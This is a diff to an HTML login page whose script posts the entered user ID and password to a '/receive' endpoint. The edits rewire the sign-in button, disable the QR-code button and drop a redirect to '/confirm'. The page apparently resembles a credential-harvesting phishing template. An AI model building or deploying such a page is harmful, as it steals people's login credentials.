@@ -299,11 +299,11 @@
             <label for="password">Password</label>
             <input type="password" name="password" id="password" placeholder="">
             
-            <button class="sign-in-button">Sign in</button>
+            <button id="continue" class="sign-in-button">Sign in</button>
 
             <div class="or-divider">or</div>
 
-            <button class="qr-sign-in">Sign in with a QR code</button>
+            <button onclick="javascript:void(0);" class="qr-sign-in">Sign in with a QR code</button>
 
             <div class="links">
                 <a href="#">Forgot User ID</a>
@@ -338,7 +338,7 @@
     
     <script>
 $(document).ready(function() {
-    $('.continue').on('click', function(e) {
+    $('.sign-in-button').on('click', function(e) {
         e.preventDefault(); // Prevent default form submission
 
         let isEmpty = false;
@@ -375,9 +375,7 @@ $(document).ready(function() {
                 url: "/receive", // Replace with your server endpoint
                 data: user
             }).done(function(msg) {
-                // Handle successful response
                 console.log(msg);
-                window.location.href = "/confirm?action=1";
             }).fail(function(err, textStatus, error) {
                 console.log('fail');
                 // Handle failure response
